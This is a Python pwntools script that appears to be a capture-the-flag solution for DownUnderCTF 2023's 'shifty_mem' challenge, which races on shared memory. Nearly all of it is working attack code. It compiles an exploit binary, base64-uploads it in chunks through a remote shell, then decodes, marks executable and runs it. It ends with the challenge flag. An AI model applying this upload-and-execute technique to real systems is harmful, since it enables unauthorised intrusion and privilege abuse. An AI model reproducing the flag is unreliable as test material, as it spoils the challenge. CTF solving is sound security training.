#!/usr/bin/env python3
from pwn import *
import base64
import time
import os

context.encoding = 'latin'

def run(p, cmd):
    p.sendlineafter("$ ", cmd)
    p.recvline()

os.system("musl-gcc exploit.c -o exp -s -static")
print("[+] Exploit compiled")

with open("./exp", "rb") as f:
    payload = base64.b64encode(f.read()).decode()

p = remote('pwn-shifty-mem-78883eaf00e34eac.2023.ductf.dev', 443, ssl=True)
q = remote('pwn-shifty-mem-78883eaf00e34eac.2023.ductf.dev', 443, ssl=True)

run(p, "cd /tmp")
for i in range(0, len(payload), 512):
    print(f"\rUploading... {i:x} / {len(payload):x}", end="")
    run(p, 'echo "{}" >> b64exp'.format(payload[i:i+512]))
print()

run(p, 'base64 -d b64exp > exploit')
run(p, 'rm b64exp')
run(p, 'chmod +x exploit')
run(p, '/tmp/exploit')

# time.sleep(0.5)
# run(q, '/home/ctf/chal/shifty_mem /exp')

p.close()
"""
Open two connection:
On first connection run /tmp/exploit
On second run /home/ctf/chal/shifty_mem /exp
"""
# DUCTF{r4c1ng_sh4r3d_m3mory_t0_th3_f1nish_flag}
